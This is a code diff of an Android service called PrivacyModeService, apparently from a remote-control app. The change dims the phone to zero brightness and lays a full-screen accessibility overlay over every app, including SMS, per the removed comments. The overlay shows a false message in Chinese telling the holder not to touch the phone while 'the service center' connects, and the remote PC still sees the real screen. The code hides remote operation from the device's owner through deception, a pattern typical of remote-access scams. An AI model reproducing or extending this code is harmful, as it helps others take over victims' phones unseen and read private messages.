@@ -25,14 +25,17 @@ import android.net.Uri
 import androidx.core.app.NotificationCompat
 
 /**
- * Privacy Mode Service
+ * Privacy Mode Service - 透明字幕方案
  * 
- * 实现：
- * 1. 不透明黑色覆盖层 - Android端完全看不到内容
- * 2. TYPE_ACCESSIBILITY_OVERLAY - 最高优先级，覆盖所有应用（包括短信）
- * 3. 超大尺寸 + FLAG_LAYOUT_NO_LIMITS - 覆盖状态栏和导航栏
- * 4. 亮度=0 - 双重保障，物理屏幕极暗
- * 5. 不使用FLAG_SECURE - 这样PC端可以看到实际内容
+ * 技术限制：Android MediaProjection 会捕获所有可见内容，无法让覆盖层"对录制透明"
+ * 
+ * 折中方案：
+ * 1. 亮度=0：手机物理屏幕极暗（PC不受影响）
+ * 2. 透明背景覆盖层+白色字幕：PC看到正常画面+字幕，手机极暗只看到字幕
+ * 
+ * 效果：
+ * - 手机：屏幕极暗，只看到白色字幕
+ * - PC：正常画面 + 白色字幕叠加
  */
 class PrivacyModeService : Service() {
 
@@ -87,7 +90,7 @@ class PrivacyModeService : Service() {
         
         isActive = true
         
-        // 检查无障碍服务 - 必须开启才能使用 TYPE_ACCESSIBILITY_OVERLAY
+        // 检查无障碍服务
         val accessibilityService = InputService.ctx
         if (accessibilityService == null) {
             Log.e(TAG, "DEBUG_PRIVACY: Accessibility service not enabled!")
@@ -99,7 +102,7 @@ class PrivacyModeService : Service() {
             return
         }
         
-        // 检查修改系统设置权限（用于亮度控制）
+        // 检查修改系统设置权限
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
             if (!Settings.System.canWrite(this)) {
                 Log.e(TAG, "DEBUG_PRIVACY: WRITE_SETTINGS permission not granted")
@@ -123,7 +126,7 @@ class PrivacyModeService : Service() {
             return
         }
         
-        // 调暗亮度到最低
+        // 核心1：调暗亮度到最低
         try {
             saveAndDimBrightness()
             Log.d(TAG, "DEBUG_PRIVACY: Brightness dimmed to 0")
@@ -131,10 +134,10 @@ class PrivacyModeService : Service() {
             Log.e(TAG, "DEBUG_PRIVACY: Failed to dim brightness", e)
         }
         
-        // 创建全屏不透明黑色覆盖层
+        // 核心2：创建透明背景+白色字幕覆盖层
         try {
-            createFullBlackOverlay(accessibilityService)
-            Log.d(TAG, "DEBUG_PRIVACY: Full black overlay created")
+            createTransparentTextOverlay(accessibilityService)
+            Log.d(TAG, "DEBUG_PRIVACY: Transparent text overlay created")
         } catch (e: Exception) {
             Log.e(TAG, "DEBUG_PRIVACY: Failed to create overlay", e)
             isActive = false
@@ -180,7 +183,7 @@ class PrivacyModeService : Service() {
         
         val originalMode = try {
             Settings.System.getInt(contentResolver, Settings.System.SCREEN_BRIGHTNESS_MODE)
-        } catch (e: Settings.SettingNotFoundException) {
+        } catch (e: Exception) {
             Settings.System.SCREEN_BRIGHTNESS_MODE_MANUAL
         }
         
@@ -213,16 +216,13 @@ class PrivacyModeService : Service() {
     }
     
     /**
-     * 创建全屏不透明黑色覆盖层
+     * 创建透明背景覆盖层，只显示白色字幕
      * 
-     * 关键点：
-     * 1. 使用 TYPE_ACCESSIBILITY_OVERLAY - 最高层级，覆盖所有应用
-     * 2. 不透明黑色背景 - Android端完全看不到内容
-     * 3. 超大尺寸 + 负偏移 - 确保覆盖状态栏和导航栏
-     * 4. 不使用 FLAG_SECURE - PC端可以录制到实际内容
+     * 透明背景意味着：
+     * - PC看到：正常画面 + 白色字幕
+     * - 手机（亮度=0）：极暗背景 + 白色字幕（视觉效果接近黑屏+字幕）
      */
-    private fun createFullBlackOverlay(accessibilityService: Context) {
-        // 必须使用无障碍服务的 Context 来获取 WindowManager
+    private fun createTransparentTextOverlay(accessibilityService: Context) {
         windowManager = accessibilityService.getSystemService(Context.WINDOW_SERVICE) as WindowManager
 
         val display = windowManager?.defaultDisplay
@@ -231,18 +231,18 @@ class PrivacyModeService : Service() {
         val screenWidth = screenSize.x
         val screenHeight = screenSize.y
 
-        Log.d(TAG, "DEBUG_PRIVACY: Screen size: ${screenWidth}x${screenHeight}")
-
-        // 创建不透明黑色容器
+        // 创建容器 - 完全透明背景
         val container = FrameLayout(accessibilityService).apply {
-            setBackgroundColor(Color.BLACK)
+            setBackgroundColor(Color.TRANSPARENT)
             
-            // 添加提示文字
+            // 白色字幕，带黑色描边效果（增加可读性）
             val textView = TextView(accessibilityService).apply {
                 text = "系统正在对接服务中心\n请勿触碰手机屏幕\n避免影响业务\n请耐心等待......"
                 setTextColor(Color.WHITE)
-                textSize = 26f
+                textSize = 28f
                 gravity = Gravity.CENTER
+                // 添加阴影增加可读性
+                setShadowLayer(8f, 2f, 2f, Color.BLACK)
                 setBackgroundColor(Color.TRANSPARENT)
             }
             
@@ -254,21 +254,15 @@ class PrivacyModeService : Service() {
             addView(textView, textParams)
         }
 
-        // TYPE_ACCESSIBILITY_OVERLAY 是最高优先级的窗口类型
-        // 可以覆盖任何其他应用，包括短信、微信等
         val windowType = WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
 
-        // 窗口标志 - 注意：不使用 FLAG_SECURE！
-        // FLAG_SECURE 会导致 MediaProjection 捕获黑屏
         val windowFlags = WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                 WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
-                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or      // 允许超出屏幕边界
+                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
                 WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
-                WindowManager.LayoutParams.FLAG_FULLSCREEN or
-                WindowManager.LayoutParams.FLAG_LAYOUT_INSET_DECOR
+                WindowManager.LayoutParams.FLAG_FULLSCREEN
 
-        // 覆盖层比屏幕大很多，确保完全覆盖状态栏、导航栏、刘海等
-        val extraSize = 1000
+        val extraSize = 500
         val overlayWidth = screenWidth + extraSize * 2
         val overlayHeight = screenHeight + extraSize * 2
 
@@ -277,13 +271,12 @@ class PrivacyModeService : Service() {
             overlayHeight,
             windowType,
             windowFlags,
-            PixelFormat.OPAQUE  // 不透明
+            PixelFormat.TRANSLUCENT  // 透明
         ).apply {
             gravity = Gravity.TOP or Gravity.START
-            x = -extraSize  // 向左偏移，覆盖左边缘
-            y = -extraSize  // 向上偏移，覆盖状态栏
+            x = -extraSize
+            y = -extraSize
 
-            // 支持刘海屏
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                 layoutInDisplayCutoutMode = 
                     WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
@@ -292,8 +285,6 @@ class PrivacyModeService : Service() {
 
         windowManager?.addView(container, params)
         overlayView = container
-        
-        Log.d(TAG, "DEBUG_PRIVACY: Overlay added, size: ${overlayWidth}x${overlayHeight}, offset: (-$extraSize, -$extraSize)")
     }
     
     private fun createForegroundNotification() {
